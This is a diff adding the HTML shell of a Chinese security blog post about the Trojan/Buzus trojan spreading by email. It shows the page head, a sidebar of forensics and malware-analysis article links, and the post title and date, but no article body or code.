@@ -1,0 +1,977 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta http-equiv="content-type" content="text/html; charset=utf-8">
+	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+	
+	<!-- title -->
+	
+	<title>
+	
+		样本分析-Trojan/Buzus“霸族”木马通过邮件传播 | 
+	 
+	x7peeps
+	</title>
+	
+	<!-- keywords,description -->
+	
+		<meta name="keywords" content="keywords" />
+	 
+		<meta name="description" content="description" />
+	
+
+	<!-- favicon -->
+	
+	<link rel="shortcut icon" href="/favicon.ico">
+	
+  
+
+	
+<link rel="stylesheet" href="/css/main.css">
+
+	
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
+
+	
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/styles/darcula.min.css">
+
+
+	
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/highlight.min.js"></script>
+
+	
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+
+	
+<script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script>
+
+	
+<script src="/js/main.js"></script>
+
+	
+		
+<script src="https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min.js"></script>
+
+		
+<script src="https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js"></script>
+
+	
+	
+		<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="x7peeps" type="application/atom+xml">
+</head>
+
+<body>
+	<header id="header">
+    <a id="title" href="/" class="logo">x7peeps</a>
+
+	<ul id="menu">
+		<li class="menu-item">
+			<a href="/about" class="menu-item-link">ABOUT</a>
+		</li>
+		
+		
+		<li class="menu-item">
+			<a href="https://github.com/xtpeeps" class="menu-item-link" target="_blank">
+				<i class="fa fa-github fa-2x"></i>
+			</a>
+		</li>
+	</ul>
+</header>
+
+	
+<div id="sidebar">
+	<button id="sidebar-toggle" class="toggle" ><i class="fa fa-arrow-right " aria-hidden="true"></i></button>
+	
+	<div id="site-toc">
+		<input id="search-input" class="search-input" type="text" placeholder="search...">
+		<div id="tree">
+			
+
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										工具
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/01/08/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-Coremail%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%AD%9B%E9%80%89%E7%AE%80%E6%98%93%E8%84%9A%E6%9C%AC/">
+										工具-Coremail日志分析筛选简易脚本
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/01/08/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-HttpMethod-UnsafeHttpMethod%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%80%9D%E8%B7%AF%E5%92%8C%E6%96%B9%E6%B3%95/">
+										工具-HttpMethod-UnsafeHttpMethod漏洞检测思路和方法
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/01/03/%E5%B7%A5%E5%85%B7/%E5%B7%A5%E5%85%B7-%E6%9C%AC%E5%9C%B0%E6%89%B9%E9%87%8Fping%E5%9F%9F%E5%90%8D%E8%84%9A%E6%9C%AC/">
+										工具-本地批量ping域名脚本
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										应急响应
+									</a>
+									
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										0x00电子取证标准
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x00%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/2.0%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E6%A0%87%E5%87%86/">
+										2.0电子取证标准
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										0x01现场勘查
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x01%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/%E7%8E%B0%E5%9C%BA%E5%8B%98%E6%9F%A5/">
+										现场勘查
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										0x02电子取证
+									</a>
+									
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										1磁盘镜像
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Clonezilla/">
+										Clonezilla
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Datanumen_disk_image/">
+										Datanumen_disk_image
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/EnCase_forensic_imager/">
+										EnCase_forensic_imager
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/16/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/GetdataForensicImager/">
+										GetdataForensicImager
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/Guymager/">
+										Guymager
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/dd:dc3dd(linux)/">
+										dd:dc3dd(linux)
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/22/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/1%E7%A3%81%E7%9B%98%E9%95%9C%E5%83%8F/%E9%95%9C%E5%83%8F%E7%B1%BB%E5%9E%8B%E5%8F%8A%E5%90%84%E4%BA%A7%E5%93%81%E7%89%B9%E6%80%A7%E5%AF%B9%E6%AF%94/">
+										镜像类型及各产品特性对比
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										2磁盘挂载
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/03/23/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/Arsenal_Image_Mounter/">
+										Arsenal_Image_Mounter
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/13/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/GetData_Mount_Image_Pro/">
+										GetData_Mount_Image_Pro
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/OSFMount/">
+										OSFMount
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/mount_command/">
+										mount_command
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/03/26/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD%E5%B7%A5%E5%85%B7%E7%89%B9%E7%82%B9%E5%AF%B9%E6%AF%94%E8%A1%A8/">
+										磁盘挂载工具特点对比表
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										3文件恢复
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/DiskGenius(win)/">
+										DiskGenius(win)
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/UFS%20explorer%20professional%20recovery(win:mac:linux)/">
+										UFS explorer professional recovery(win:mac:linux)
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/WinHEX(win)/">
+										WinHEX(win)
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2021/04/24/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/3%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/%E6%95%B0%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7%E6%80%A7%E8%83%BD%E5%AF%B9%E6%AF%94/">
+										数据恢复工具性能对比
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										4系统信息收集
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9B%BD%E6%A0%87%E4%B8%AD%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81%E7%9B%B8%E5%85%B3%E8%A6%81%E6%B1%82%E5%8F%8A%E7%BB%BC%E8%BF%B0/">
+										国标中电子取证相关要求及综述
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										应急响应关键证据检索提取
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2021/04/30/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95/">
+										命令行历史记录
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										恶意样本分析
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2019/09/03/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-1-%E9%85%8D%E7%BD%AE%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/">
+										恶意样本分析-1-配置实验环境
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/09/15/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-2-%E5%9F%BA%E7%A1%80%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/">
+										恶意样本分析-2-基础静态分析
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/09/20/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-3-%E5%9F%BA%E7%A1%80%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/">
+										恶意样本分析-3-基础动态分析
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/09/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-4-%E5%9F%BA%E7%A1%80DLL%E5%88%86%E6%9E%90/">
+										恶意样本分析-4-基础DLL分析
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/09/25/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-5-%E6%B1%87%E7%BC%96%E5%8F%8A%E5%8F%8D%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/">
+										恶意样本分析-5-汇编及反汇编基础
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/09/08/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-6-IDA%E4%BD%BF%E7%94%A8/">
+										恶意样本分析-6-IDA使用
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/11/23/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-AZORult%E9%97%B4%E8%B0%8D%E8%BD%AF%E4%BB%B6%E5%80%9F%E5%8A%A9%E9%82%AE%E4%BB%B6%E5%9C%A8%E9%87%8E%E4%BC%A0%E6%92%AD/">
+										样本分析-AZORult间谍软件借助邮件在野传播
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file active">
+									<a href="/2019/12/12/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-TrojanBuzus%E2%80%9C%E9%9C%B8%E6%97%8F%E2%80%9D%E6%9C%A8%E9%A9%AC%E9%80%9A%E8%BF%87%E9%82%AE%E4%BB%B6%E4%BC%A0%E6%92%AD/">
+										样本分析-TrojanBuzus“霸族”木马通过邮件传播
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/10/13/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E9%82%AE%E4%BB%B6%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E4%B8%AD%E5%8F%91%E7%8E%B0%E6%96%B0MYMOOD%E8%A0%95%E8%99%AB%E4%BC%A0%E6%92%AD%E5%9C%B0%E5%9D%80/">
+										样本分析-邮件恶意样本中发现新MYMOOD蠕虫传播地址
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										情报跟踪
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/04/04/%E6%83%85%E6%8A%A5%E8%B7%9F%E8%B8%AA/%E6%83%85%E6%8A%A5-Chinese_Hackers_Target_Satellite,Geospatial_Imaging,Defense_Companies/">
+										情报-Chinese_Hackers_Target_Satellite,Geospatial_Imaging,Defense_Companies
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										漏洞复现
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/03/02/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-11882_Office%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8F%8A%E4%B8%80%E7%82%B9%E6%80%9D%E8%80%83/">
+										漏洞复现-CVE-2017-11882_Office远程代码执行漏洞及一点思考
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/03/13/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-0796_SMBGhost_Remote_Code_Execution/">
+										漏洞复现-CVE-2020-0796_SMBGhost_Remote_Code_Execution
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/04/07/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2020-14645_weblogic_T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%A4%8D%E6%B5%8B/">
+										漏洞复现-CVE-2020-14645_weblogic_T3反序列化RCE复测
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/04/17/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Vulhub%E5%AE%9E%E9%AA%8C_Weblogic_SSRF%E6%BC%8F%E6%B4%9E/">
+										漏洞复现-Vulhub实验_Weblogic_SSRF漏洞
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										科普
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/09/10/%E7%A7%91%E6%99%AE/%E6%89%8B%E6%9C%BA%E4%B8%A2%E5%A4%B1%E5%90%8E%E4%B8%80%E5%AE%9A%E8%A6%81%E5%81%9A%E7%9A%84%E5%87%A0%E4%BB%B6%E5%BF%85%E5%81%9A%E4%BA%8B/">
+										手机丢失后一定要做的几件必做事
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										红蓝对抗
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/02/20/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-Cobalt_Strike-x86_payload_%E5%88%86%E6%9E%90%E5%8F%8A%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/">
+										红蓝对抗-Cobalt_Strike-x86_payload_分析及混淆加密
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2018/10/08/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97-%E5%90%8E%E6%B8%97%E9%80%8F_MYSQL%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/">
+										红蓝对抗-后渗透_MYSQL提权小结
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										页面篡改分析
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/05/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-EVAL%E5%8A%A0%E5%AF%86/">
+										页面篡改分析-EVAL加密
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/05/24/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-JS%E7%9A%84eval()%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E8%B7%B3%E8%BD%AC/">
+										页面篡改分析-JS的eval()加密方式跳转
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/07/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E5%9F%BA%E4%BA%8Esojson.v4%E6%B7%B7%E6%B7%86%E7%9A%84%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90/">
+										页面篡改分析-基于sojson.v4混淆的页面篡思路分析
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/04/18/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E7%9F%AD%E9%93%BE%E6%8E%A5%E5%A4%9A%E7%BA%A7%E8%B7%B3%E8%BD%AC/">
+										页面篡改分析-短链接多级跳转
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/05/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%87%8D%E5%AE%9A%E5%90%91%E7%AF%A1%E6%94%B9%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E5%8F%8A%E5%9B%9E%E6%BA%AF%E8%BF%87%E7%A8%8B/">
+										页面篡改分析-重定向篡改事件的分析及回溯过程
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2019/03/13/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E9%A6%96%E6%AC%A1%E4%BC%9A%E8%AF%9D%E8%B7%B3%E8%BD%AC%E8%8F%A0%E8%8F%9C%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/">
+										页面篡改分析-首次会话跳转菠菜页面篡改分析
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+							<ul>
+								<li class="file">
+									<a href="/2020/06/11/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90%E4%B8%80%E5%A4%84BoCai%E9%A1%B5%E9%9D%A2/">
+										页面篡改分析一处BoCai页面
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										编程
+									</a>
+									
+							<ul>
+								<li class="directory">
+									<a href="#" class="directory">
+										<i class="fa fa-plus-square-o"></i>
+										python
+									</a>
+									
+							<ul>
+								<li class="file">
+									<a href="/2020/09/11/%E7%BC%96%E7%A8%8B/python/scrapy%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6/">
+										scrapy爬虫框架
+									</a>
+								</li>
+								<div class="article-toc" style="display: none;"></div>
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+								</li>
+								
+							</ul>
+			
+		</div>
+	</div>
+</div>
+
+	<!-- 引入正文 -->
+	<div id="content">
+		<h1 id="article-title">
+
+	样本分析-TrojanBuzus“霸族”木马通过邮件传播
+</h1>
+<div class="article-meta">
+	
+	<span>x7</span>
+	<span>2019-12-12 20:31:00</span>
+    
+		<div id="article-categories">
+            
+		</div>
+    
+</div>
+
